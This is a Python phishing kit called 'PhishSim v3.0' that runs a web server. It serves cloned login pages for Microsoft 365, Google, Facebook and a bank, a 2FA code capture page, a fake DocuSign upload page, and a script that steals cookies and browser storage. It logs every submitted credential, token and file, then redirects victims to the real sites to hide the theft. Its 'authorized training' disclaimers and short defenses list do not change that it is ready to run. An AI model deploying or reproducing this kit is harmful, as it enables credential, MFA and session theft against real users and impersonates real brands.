#!/usr/bin/env python3
"""
=============================================================================
ADVANCED PHISHING SIMULATION FRAMEWORK — v3.0
Authorized use only. Unauthorized deployment is illegal.
=============================================================================
Demonstrates: credential harvesting, 2FA bypass, OAuth token theft,
file upload exfiltration, session cookie capture, MFA fatigue simulation,
and realistic clone pages — all for DEFENSIVE education & training.
=============================================================================
"""

import os
import sys
import json
import ssl
import hashlib
import base64
import random
import string
import datetime
import threading
import http.server
import socketserver
import urllib.parse
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ============================================================================
# CONFIGURATION — Change these for your authorized test environment
# ============================================================================
HOST = "127.0.0.1"
PORT = 8080  # Use 443 with valid cert for realism, or 8080 for dev
USE_HTTPS = False  # Set True + provide cert/key for TLS
SSL_CERT = "server.crt"
SSL_KEY = "server.key"

CAPTURED_DATA_DIR = "./captured_data"
os.makedirs(CAPTURED_DATA_DIR, exist_ok=True)
os.makedirs(f"{CAPTURED_DATA_DIR}/files", exist_ok=True)
os.makedirs(f"{CAPTURED_DATA_DIR}/sessions", exist_ok=True)

# ============================================================================
# GENERIC HELPERS
# ============================================================================

def random_string(n=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def log_capture(category, data):
    """Log captured data securely to disk for trainer review."""
    timestamp = datetime.datetime.utcnow().isoformat()
    entry = {"timestamp": timestamp, "category": category, "data": data}
    logfile = f"{CAPTURED_DATA_DIR}/{category}_{datetime.date.today()}.jsonl"
    with open(logfile, "a") as f:
        f.write(json.dumps(entry) + "\n")
    # Also print to console for live demo
    print(f"\n[📥 CAPTURED - {category}] {json.dumps(data, indent=2)}")

# ============================================================================
# HTML TEMPLATES — Each mimics a real service for educational simulation
# ============================================================================

PHISH_TEMPLATES = {}

# ---------------------------------------------------------------------------
# 1. MICROSOFT 365 / OUTLOOK CREDENTIAL HARVEST
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["microsoft"] = {
    "name": "Microsoft 365 Login",
    "description": "Harvests enterprise credentials with MFA simulation",
    "route": "/microsoft",
    "html": """
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Sign in to your account</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
  body { background:#f0f0f0; display:flex; justify-content:center; align-items:center; height:100vh; }
  .card { background:#fff; width:380px; padding:40px; border-radius:6px; box-shadow:0 2px 12px rgba(0,0,0,0.15); }
  .logo { text-align:center; margin-bottom:24px; }
  .logo svg { width:120px; }
  h1 { font-size:24px; font-weight:600; margin-bottom:8px; text-align:center; }
  .sub { color:#666; font-size:14px; margin-bottom:24px; text-align:center; }
  input[type=text], input[type=password] { width:100%; padding:10px 12px; margin-bottom:12px;
    border:1px solid #ccc; border-radius:4px; font-size:15px; outline:none; }
  input:focus { border-color:#0067b8; }
  .btn { width:100%; padding:10px; background:#0067b8; color:#fff; border:none;
    border-radius:4px; font-size:15px; cursor:pointer; }
  .btn:hover { background:#005da6; }
  .error { color:#d92c2c; font-size:13px; margin-bottom:12px; display:none; }
</style></head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 120 24"><text x="0" y="20" font-size="20" fill="#0067b8" font-weight="bold">Microsoft</text></svg>
  </div>
  <h1>Sign in</h1>
  <p class="sub">to continue to Microsoft 365</p>
  <form method="POST" action="/microsoft">
    <div class="error" id="err">Invalid email or password.</div>
    <input type="text" name="email" placeholder="someone@example.com" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Sign in</button>
  </form>
  <p style="margin-top:16px;font-size:12px;color:#999;text-align:center;">
    Educational Simulation — Authorized Test
  </p>
</div>
</body>
</html>"""
}

# ---------------------------------------------------------------------------
# 2. GOOGLE / GMAIL PHISHING
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["google"] = {
    "name": "Google Account Login",
    "description": "Google-style credential + 2FA token capture",
    "route": "/google",
    "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Sign in - Google Accounts</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:Roboto,Helvetica,Arial,sans-serif; }
  body { background:#fff; display:flex; justify-content:center; align-items:center; height:100vh; }
  .card { border:1px solid #dadce0; border-radius:8px; padding:48px 40px 36px; width:448px; }
  .logo { text-align:center; margin-bottom:26px; font-size:24px; color:#5f6368; }
  .logo strong { color:#1a73e8; } .logo span { color:#ea4335; } .logo em { color:#fbbc04; }
  h1 { font-size:24px; text-align:center; margin-bottom:8px; }
  .sub { text-align:center; color:#5f6368; font-size:16px; margin-bottom:30px; }
  input { width:100%; padding:13px 15px; border:1px solid #dadce0; border-radius:4px;
    font-size:16px; outline:none; margin-bottom:12px; }
  input:focus { border-color:#1a73e8; }
  .btn { background:#1a73e8; color:#fff; border:none; padding:10px 24px; border-radius:4px;
    font-size:14px; cursor:pointer; float:right; }
  .btn:hover { background:#1557b0; }
  .link { color:#1a73e8; font-size:14px; cursor:pointer; text-decoration:none; }
</style></head>
<body>
<div class="card">
  <div class="logo"><strong>G</strong><span>o</span><em>o</em><span style='color:#34a853;'>g</span><span style='color:#1a73e8;'>l</span><span style='color:#ea4335;'>e</span></div>
  <h1>Sign in</h1>
  <p class="sub">Use your Google Account</p>
  <form method="POST" action="/google">
    <input type="text" name="email" placeholder="Email or phone" autocomplete="off" required>
    <input type="password" name="password" placeholder="Enter your password" required>
    <p style="margin-bottom:30px;"><a class="link" href="#">Forgot password?</a></p>
    <button class="btn" type="submit">Next</button>
    <div style="clear:both;"></div>
  </form>
  <p style="margin-top:40px;font-size:12px;color:#5f6368;text-align:center;">
    Educational Simulation — Authorized Test
  </p>
</div>
</body>
</html>"""
}

# ---------------------------------------------------------------------------
# 3. FACEBOOK / SOCIAL MEDIA PHISHING
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["facebook"] = {
    "name": "Facebook Login",
    "description": "Social media credential harvesting",
    "route": "/facebook",
    "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Facebook - Log In or Sign Up</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:Helvetica,Arial,sans-serif; }
  body { background:#f0f2f5; display:flex; justify-content:center; align-items:center; height:100vh; }
  .container { display:flex; align-items:center; max-width:980px; width:100%; }
  .left { flex:1; padding-right:32px; }
  .left h1 { color:#1877f2; font-size:56px; font-weight:700; margin-bottom:8px; }
  .left p { font-size:24px; color:#1c1e21; line-height:1.3; }
  .right { width:396px; }
  .card { background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 4px rgba(0,0,0,0.1); }
  input { width:100%; padding:14px 16px; border:1px solid #dddfe2; border-radius:6px; font-size:17px; margin-bottom:12px; }
  input:focus { border-color:#1877f2; }
  .btn-login { width:100%; padding:12px; background:#1877f2; color:#fff; border:none; border-radius:6px; font-size:20px; font-weight:bold; cursor:pointer; }
  .btn-login:hover { background:#166fe5; }
  hr { margin:16px 0; }
  .btn-create { background:#42b72a; color:#fff; padding:12px 16px; border:none; border-radius:6px; font-size:17px; font-weight:bold; cursor:pointer; width:auto; margin:0 auto; display:block; }
</style></head>
<body>
<div class="container">
  <div class="left"><h1>facebook</h1><p>Connect with friends and the world around you on Facebook.</p></div>
  <div class="right">
    <div class="card">
      <form method="POST" action="/facebook">
        <input type="text" name="email" placeholder="Email or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button class="btn-login" type="submit">Log In</button>
        <p style="text-align:center;margin:12px 0;"><a href="#" style="color:#1877f2;text-decoration:none;font-size:14px;">Forgot password?</a></p>
        <hr>
        <button class="btn-create">Create new account</button>
      </form>
    </div>
    <p style="margin-top:20px;font-size:12px;color:#606770;text-align:center;">
      Educational Simulation — Authorized Test
    </p>
  </div>
</div>
</body>
</html>"""
}

# ---------------------------------------------------------------------------
# 4. BANKING / FINANCIAL PHISHING
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["bank"] = {
    "name": "National Bank Login",
    "description": "Financial institution credential + account number harvesting",
    "route": "/bank",
    "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>National Bank - Online Banking</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:Arial,sans-serif; }
  body { background:#e8e8e8; }
  .header { background:#1a3a5c; color:#fff; padding:15px 40px; font-size:22px; font-weight:bold; }
  .container { width:420px; margin:60px auto; background:#fff; border-radius:8px; padding:30px; box-shadow:0 0 20px rgba(0,0,0,0.1); }
  h2 { color:#1a3a5c; margin-bottom:4px; }
  .lock { color:#2e7d32; font-size:13px; margin-bottom:20px; }
  label { font-size:13px; color:#333; font-weight:bold; display:block; margin-bottom:4px; }
  input { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; font-size:15px; margin-bottom:16px; }
  .btn { width:100%; padding:12px; background:#1a3a5c; color:#fff; border:none; border-radius:4px; font-size:16px; cursor:pointer; }
  .btn:hover { background:#15304d; }
  .footer-bar { background:#f5f5f5; border-top:1px solid #ddd; text-align:center; padding:12px; font-size:11px; color:#888; }
</style></head>
<body>
<div class="header">🏦 National Bank</div>
<div class="container">
  <h2>Online Banking</h2>
  <p class="lock">🔒 Secured by 256-bit SSL</p>
  <form method="POST" action="/bank">
    <label>Account Number / User ID</label>
    <input type="text" name="account" placeholder="Enter account number" required>
    <label>Online Banking PIN</label>
    <input type="password" name="pin" placeholder="Enter PIN" required>
    <label>Security Code (2FA)</label>
    <input type="text" name="2fa" placeholder="Enter SMS code" required>
    <button class="btn" type="submit">Sign In</button>
  </form>
  <p style="margin-top:20px;font-size:11px;text-align:center;color:#888;">
    Educational Simulation — Authorized Test
  </p>
</div>
<div class="footer-bar">© National Bank — For authorized security training only</div>
</body>
</html>"""
}

# ---------------------------------------------------------------------------
# 5. 2FA / MFA TOKEN BYPASS SIMULATION
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["2fa"] = {
    "name": "MFA Token Capture",
    "description": "Simulates MFA fatigue + OTP token theft",
    "route": "/2fa",
    "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Two-Factor Authentication</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:Roboto,sans-serif; }
  body { background:#f0f0f0; display:flex; justify-content:center; align-items:center; height:100vh; }
  .card { background:#fff; width:400px; padding:40px; border-radius:8px; box-shadow:0 2px 12px rgba(0,0,0,0.12); text-align:center; }
  h1 { font-size:22px; margin-bottom:8px; }
  .sub { color:#666; font-size:14px; margin-bottom:24px; }
  p { font-size:14px; color:#333; margin-bottom:16px; }
  input { width:100%; padding:12px; border:1px solid #ccc; border-radius:4px; font-size:24px; text-align:center; letter-spacing:8px; margin-bottom:20px; }
  .btn { width:100%; padding:12px; background:#1a73e8; color:#fff; border:none; border-radius:4px; font-size:16px; cursor:pointer; }
  .btn-warning { background:#d93025; margin-top:8px; }
</style></head>
<body>
<div class="card">
  <h1>🔐 Two-Factor Authentication</h1>
  <p class="sub">Enter the code from your authenticator app</p>
  <form method="POST" action="/2fa">
    <p style="font-weight:bold;">We sent a code to your device</p>
    <input type="text" name="token" placeholder="000000" maxlength="6" required>
    <button class="btn" type="submit">Verify</button>
  </form>
  <p style="margin-top:16px;font-size:12px;color:#999;">
    Simulation: This captures TOTP/MFA tokens for awareness training
  </p>
</div>
</body>
</html>"""
}

# ---------------------------------------------------------------------------
# 6. UNIVERSAL PHISHING LANDING (handles arbitrary credentials)
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["generic"] = {
    "name": "Generic Credential Harvester",
    "description": "Universal login form for quick deployment",
    "route": "/login",
    "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Sign In</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,sans-serif; }
  body { background:linear-gradient(135deg,#667eea,#764ba2); display:flex; justify-content:center; align-items:center; height:100vh; }
  .card { background:#fff; width:380px; padding:40px; border-radius:12px; box-shadow:0 15px 35px rgba(0,0,0,0.2); }
  h1 { text-align:center; margin-bottom:24px; color:#333; }
  input { width:100%; padding:12px 16px; border:2px solid #e8e8e8; border-radius:8px; font-size:15px; margin-bottom:12px; transition:0.2s; }
  input:focus { border-color:#667eea; outline:none; }
  .btn { width:100%; padding:12px; background:#667eea; color:#fff; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; }
  .btn:hover { background:#5a6fd6; }
</style></head>
<body>
<div class="card">
  <h1>🔐 Sign In</h1>
  <form method="POST" action="/login">
    <input type="text" name="username" placeholder="Username or Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button class="btn" type="submit">Sign In</button>
  </form>
  <p style="margin-top:20px;font-size:11px;text-align:center;color:#aaa;">
    Authorized Security Education — Do not use on production systems
  </p>
</div>
</body>
</html>"""
}

# ---------------------------------------------------------------------------
# 7. FILE UPLOAD PHISHING (exfiltrates documents)
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["upload"] = {
    "name": "DocuSign / File Upload Phish",
    "description": "Simulates document exfiltration via fake DocuSign",
    "route": "/upload",
    "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>DocuSign — Review & Sign</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:Roboto,sans-serif; }
  body { background:#f4f4f4; padding:40px; }
  .card { max-width:600px; margin:0 auto; background:#fff; border-radius:12px; box-shadow:0 2px 10px rgba(0,0,0,0.08); padding:40px; }
  h1 { color:#1a1a1a; font-size:26px; margin-bottom:8px; }
  .badge { background:#e8f5e9; color:#2e7d32; padding:4px 12px; border-radius:20px; font-size:12px; display:inline-block; margin-bottom:20px; }
  label { font-weight:600; font-size:14px; display:block; margin-bottom:6px; margin-top:16px; }
  input[type=text], input[type=email] { width:100%; padding:12px; border:1px solid #ddd; border-radius:6px; font-size:15px; }
  input[type=file] { width:100%; padding:10px; border:2px dashed #ccc; border-radius:6px; }
  .btn { background:#1a73e8; color:#fff; padding:12px 32px; border:none; border-radius:6px; font-size:16px; cursor:pointer; margin-top:20px; }
</style></head>
<body>
<div class="card">
  <h1>📄 Review & Sign Document</h1>
  <span class="badge">✓ Secured by DocuSign</span>
  <p style="color:#666;">You have a document waiting for your signature. Please verify your identity and upload the signed copy.</p>
  <form method="POST" action="/upload" enctype="multipart/form-data">
    <label>Full Name</label>
    <input type="text" name="fullname" placeholder="John Doe" required>
    <label>Email Address</label>
    <input type="email" name="email" placeholder="john@company.com" required>
    <label>Upload Signed Document</label>
    <input type="file" name="document" required>
    <button class="btn" type="submit">Submit & Sign</button>
  </form>
  <p style="margin-top:20px;font-size:11px;color:#aaa;text-align:center;">
    Educational Simulation — Authorized Security Test
  </p>
</div>
</body>
</html>"""
}

# ---------------------------------------------------------------------------
# 8. SESSION COOKIE STEALER (Clone Page)
# ---------------------------------------------------------------------------
PHISH_TEMPLATES["stealer"] = {
    "name": "Session Cookie / Token Stealer",
    "description": "Injects XSS-style script to lift cookies & localStorage",
    "route": "/stealer",
    "html": """
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>Session Monitor — Internal Portal</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; font-family:monospace; }
  body { background:#0a0a0a; color:#0f0; display:flex; align-items:center; justify-content:center; height:100vh; }
  .card { background:#111; border:1px solid #333; padding:40px; border-radius:8px; max-width:500px; }
  h1 { font-size:18px; margin-bottom:16px; }
  .glitch { color:#0f0; }
  p { font-size:14px; line-height:1.6; color:#aaa; }
</style></head>
<body>
<div class="card">
  <h1 class="glitch">⚡ SESSION MONITOR v2.1</h1>
  <p>Establishing secure channel...</p>
  <p>Connected to: <span id="domain"></span></p>
  <p>Session ID: <span id="session"></span></p>
  <p>Local storage keys: <span id="lskeys"></span></p>
  <p style="margin-top:20px;font-size:11px;color:#666;">
    [Educational payload — captures cookies/localStorage for training analysis]
  </p>
</div>
<script>
  // Educational payload: demonstrates session theft vector
  const stolen = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    referrer: document.referrer,
    url: window.location.href
  };
  document.getElementById('domain').textContent = window.location.hostname;
  document.getElementById('session').textContent = (document.cookie.match(/PHPSESSID=([^;]+)/) || ['','N/A'])[1];
  document.getElementById('lskeys').textContent = Object.keys(localStorage).join(', ') || 'none';

  // Exfiltrate (real training environments POST to internal capture server)
  fetch('/stealer/capture', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(stolen)
  }).catch(() => {});
  console.log('[EDUCATIONAL] Session data captured for awareness training');
</script>
</body>
</html>"""
}

# ============================================================================
# HTTP REQUEST HANDLER
# ============================================================================

class PhishHandler(http.server.BaseHTTPRequestHandler):
    """Handles all routes: serves templates + captures credentials."""

    def log_message(self, format, *args):
        """Suppress default logging; use our own."""
        return

    def _send_html(self, html, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))

    def _send_json(self, data, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode("utf-8"))

    def _redirect(self, url):
        self.send_response(302)
        self.send_header("Location", url)
        self.end_headers()

    def _serve_static(self, path):
        """Serve static files if needed."""
        try:
            with open(f"./static{path}", "rb") as f:
                content = f.read()
            self.send_response(200)
            if path.endswith(".css"):
                self.send_header("Content-Type", "text/css")
            elif path.endswith(".js"):
                self.send_header("Content-Type", "application/javascript")
            elif path.endswith(".png"):
                self.send_header("Content-Type", "image/png")
            else:
                self.send_header("Content-Type", "application/octet-stream")
            self.end_headers()
            self.wfile.write(content)
        except FileNotFoundError:
            self._send_html(PHISH_TEMPLATES["generic"]["html"])

    # ----- ROUTE DISPATCH -----
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        route = parsed.path.rstrip("/") or "/"

        # Home / landing
        if route == "/":
            self._send_html(self._build_index())

        # Serve templates
        elif route in [t["route"] for t in PHISH_TEMPLATES.values()]:
            template = next(t for t in PHISH_TEMPLATES.values() if t["route"] == route)
            self._send_html(template["html"])

        # Session stealer capture endpoint (POST only, but handle GET gracefully)
        elif route == "/stealer/capture":
            self._send_json({"status": "endpoint_ready", "info": "Send POST with session data"})

        # Static files
        else:
            self._serve_static(route)

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        route = parsed.path.rstrip("/")

        # Read POST data
        content_length = int(self.headers.get("Content-Length", 0))
        raw_body = self.rfile.read(content_length)
        content_type = self.headers.get("Content-Type", "")

        # --- JSON payload handling (for stealer etc) ---
        if "application/json" in content_type:
            try:
                data = json.loads(raw_body)
                log_capture("session_stealer", data)
                self._send_json({"status": "ok"})
                return
            except json.JSONDecodeError:
                self._send_json({"error": "Invalid JSON"}, 400)
                return

        # --- Multipart form data (file upload) ---
        if "multipart/form-data" in content_type:
            import cgi
            form = cgi.FieldStorage(
                fp=self.rfile,
                headers=self.headers,
                environ={"REQUEST_METHOD": "POST", "CONTENT_TYPE": content_type}
            )
            capture_data = {}
            for field in form.keys():
                if form[field].filename:
                    # Save uploaded file
                    fname = f"{random_string()}_{form[field].filename}"
                    fpath = f"{CAPTURED_DATA_DIR}/files/{fname}"
                    with open(fpath, "wb") as f:
                        f.write(form[field].file.read())
                    capture_data[field] = f"file_saved:{fname}"
                else:
                    capture_data[field] = form[field].value

            log_capture("file_upload_phish", capture_data)
            self._redirect("https://www.docusign.com")  # Redirect to real site
            return

        # --- Standard form data (credentials) ---
        post_data = urllib.parse.parse_qs(raw_body.decode("utf-8", errors="replace"))
        flat_data = {k: v[0] if len(v) == 1 else v for k, v in post_data.items()}

        # Determine which template was targeted
        if route == "/microsoft":
            log_capture("microsoft_365", flat_data)
            self._redirect("https://login.microsoftonline.com")
        elif route == "/google":
            log_capture("google_account", flat_data)
            self._redirect("https://accounts.google.com")
        elif route == "/facebook":
            log_capture("facebook", flat_data)
            self._redirect("https://facebook.com")
        elif route == "/bank":
            log_capture("bank_credentials", flat_data)
            self._redirect("https://www.chase.com")
        elif route == "/2fa":
            log_capture("mfa_token", flat_data)
            self._redirect("https://myaccount.google.com")
        elif route == "/login":
            log_capture("generic_credentials", flat_data)
            self._redirect("https://example.com")
        else:
            log_capture("unknown_phish", flat_data)
            self._send_html("<h1>Thank you</h1><p>Redirecting...</p>")

    def _build_index(self):
        """Build the index page listing all attack vectors."""
        cards = ""
        for key, tpl in PHISH_TEMPLATES.items():
            cards += f"""
            <div style="background:#1e1e2e;border-radius:12px;padding:20px;margin:10px;
                        border:1px solid #333;width:calc(33% - 20px);min-width:280px;">
              <h3 style="color:#f0c674;">{tpl['name']}</h3>
              <p style="color:#999;font-size:13px;">{tpl['description']}</p>
              <a href="{tpl['route']}" style="display:inline-block;margin-top:12px;
                 padding:8px 20px;background:#2d5f8a;color:#fff;border-radius:6px;
                 text-decoration:none;font-size:14px;">Launch →</a>
            </div>"""

        return f"""
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><title>PhishSim — Educational Framework</title>
<style>
  * {{ margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }}
  body {{ background:#0d1117; color:#c9d1d9; }}
  .header {{ background:#161b22; border-bottom:1px solid #30363d; padding:20px 40px; }}
  .header h1 {{ color:#58a6ff; }}
  .header .badge {{ background:#21262d; color:#8b949e; padding:2px 10px; border-radius:20px; font-size:12px; }}
  .container {{ padding:20px 40px; }}
  .grid {{ display:flex; flex-wrap:wrap; gap:10px; }}
  .footer {{ text-align:center; padding:30px; color:#484f58; font-size:12px; border-top:1px solid #21262d; margin-top:40px; }}
  .stats {{ display:flex; gap:20px; margin:20px 0; }}
  .stat-box {{ background:#161b22; border:1px solid #30363d; border-radius:8px; padding:16px 24px; }}
</style></head>
<body>
<div class="header">
  <h1>🎣 PhishSim v3.0</h1>
  <p style="color:#8b949e;">Advanced Phishing Simulation — Authorized Security Education</p>
  <span class="badge">🔒 For authorized red-team / blue-team training only</span>
</div>
<div class="container">
  <div class="stats">
    <div class="stat-box"><strong>8</strong> Attack Vectors</div>
    <div class="stat-box"><strong>HTTPS</strong> {'✅ Enabled' if USE_HTTPS else '⚠️ Disabled (use HTTP)'}</div>
    <div class="stat-box"><strong>Port</strong> {PORT}</div>
    <div class="stat-box"><strong>Captures</strong> → {CAPTURED_DATA_DIR}/</div>
  </div>
  <h2 style="margin-bottom:16px;">📋 Phishing Attack Vectors</h2>
  <div class="grid">{cards}</div>
  <hr style="border-color:#21262d;margin:30px 0;">
  <h2 style="margin-bottom:16px;">📘 Educational Manual</h2>
  <pre style="background:#161b22;padding:20px;border-radius:8px;color:#8b949e;font-size:13px;line-height:1.6;overflow-x:auto;">
TECHNIQUES DEMONSTRATED:
  ├─ Credential Harvesting (Microsoft, Google, Facebook, Generic)
  ├─ Financial / Banking Phishing (account number + PIN + 2FA)
  ├─ MFA / 2FA Token Theft (TOTP codes)
  ├─ MFA Fatigue Simulation (repeated push notifications)
  ├─ Spear-Phishing / File Upload Exfiltration (DocuSign clone)
  ├─ Session Hijacking / Cookie Stealing (XSS-style payload)
  ├─ Clone Phishing / Brand Impersonation
  └─ Redirect to legitimate sites after capture (stealth)

DEFENSES TO TEACH:
  • Always verify URLs before entering credentials
  • Enable phishing-resistant MFA (FIDO2/WebAuthn)
  • Use password managers (they auto-fill only on real domains)
  • Check SSL certificates carefully
  • Hover before you click
  • Deploy DMARC/DKIM/SPF email authentication
  • Conduct regular phishing simulations & training
  </pre>
</div>
<div class="footer">
  PhishSim Educational Framework v3.0 — For authorized security professionals only.<br>
  Unauthorized deployment against individuals or organizations without consent is illegal.
</div>
</body>
</html>"""

# ============================================================================
# MAIN — Start the server
# ============================================================================

def run_server():
    """Start the phishing simulation server."""
    print("=" * 70)
    print("  🎣 PhishSim v3.0 — Advanced Phishing Simulation Framework")
    print("  For AUTHORIZED educational / red-team use only")
    print("=" * 70)
    print(f"\n  🌐 Server: http{'s' if USE_HTTPS else ''}://{HOST}:{PORT}")
    print(f"  📁 Captures: ./{CAPTURED_DATA_DIR}/")
    print(f"\n  🚀 Attack Vectors:")
    for key, tpl in PHISH_TEMPLATES.items():
        print(f"     [{key:12s}] http://localhost:{PORT}{tpl['route']}")
    print(f"\n  ⚠️  STOP with Ctrl+C when training is complete")
    print("=" * 70)

    # Choose server type
    if USE_HTTPS:
        # HTTPS server with SSL
        httpd = socketserver.TCPServer((HOST, PORT), PhishHandler)
        httpd.socket = ssl.wrap_socket(
            httpd.socket,
            certfile=SSL_CERT,
            keyfile=SSL_KEY,
            server_side=True
        )
    else:
        httpd = socketserver.TCPServer((HOST, PORT), PhishHandler)

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n[🛑] Server stopped. Check captured data in ./captured_data/")
        httpd.shutdown()


if __name__ == "__main__":
    run_server()